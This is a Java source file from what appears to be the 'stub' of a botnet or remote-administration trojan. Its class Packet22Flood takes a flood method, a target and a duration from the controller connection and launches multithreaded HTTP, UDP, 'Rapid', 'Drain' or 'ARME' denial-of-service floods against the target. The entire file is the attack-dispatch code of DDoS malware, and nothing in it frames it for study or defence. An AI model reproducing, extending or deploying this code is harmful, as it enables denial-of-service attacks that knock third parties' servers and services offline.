package com.redpois0n.stub.stub.packets.incoming;

import com.redpois0n.common.Flood;
import com.redpois0n.stub.Connection;
import com.redpois0n.stub.Constants;
import com.redpois0n.stub.flood.ARME;
import com.redpois0n.stub.flood.Drain;
import com.redpois0n.stub.flood.HTTP;
import com.redpois0n.stub.flood.Rapid;
import com.redpois0n.stub.flood.ThreadFlood;
import com.redpois0n.stub.flood.UDP;

public class Packet22Flood extends AbstractIncomingPacket {
	
	public static final int THREADS = 5;

	@Override
	public void read() throws Exception {
		int method = Connection.readInt();
		String target = Connection.readLine();
		int seconds = Connection.readInt();
					
		if (method == Flood.GET.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_GET), seconds);
		} else if (method == Flood.POST.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_POST), seconds);
		} else if (method == Flood.HEAD.getNumeric()) {
			start(new HTTP(target, Constants.HTTP_HEAD), seconds);
		} else if (method == Flood.UDP.getNumeric()) {
			start(new UDP(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		} else if (method == Flood.RAPID.getNumeric()) {
			start(new Rapid(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		} else if (method == Flood.DRAIN.getNumeric()) {
			start(new Drain(target), seconds);
		} else if (method == Flood.ARME.getNumeric()) {
			start(new ARME(target.split(":")[0], Integer.parseInt(target.split(":")[1])), seconds);
		}
	}
	
	public static void start(Runnable flood, int seconds) {
		new Thread(new ThreadFlood(seconds)).start();
		
		for (int i = 0; i < THREADS; i++) {
			new Thread(flood).start();
		}

	}

}
